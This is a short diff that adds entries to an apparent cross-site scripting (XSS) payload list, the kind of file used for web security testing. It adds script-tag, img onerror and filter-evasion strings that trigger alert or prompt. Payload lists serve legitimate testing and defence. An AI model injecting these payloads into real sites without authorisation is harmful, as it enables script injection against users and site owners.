@@ -8,6 +8,9 @@
 <<SCRIPT>alert("XSS");//<</SCRIPT>
 </script><script>alert('XSS');</script>
 <svg onload=alert(1)>
+<script>prompt(1);</script>
+"; prompt(1);--
+<img src=x onerror=alert(1)>
 "><svg onload=alert(1)>
 </tag><svg onload=alert(1)>
 "></tag><svg onload=alert(1)>
@@ -15,6 +18,8 @@
 "autofocus/onfocus=alert(1)//
 javascript:alert(1)
 data:text/html,<svg onload=alert(1)>
+<scr<script>ipt>alert(1);</sc</script>ript>
+/"></script><script>alert(1);</script>
 ';alert(1);//
 '-alert(1)-'
 '-alert(1)//
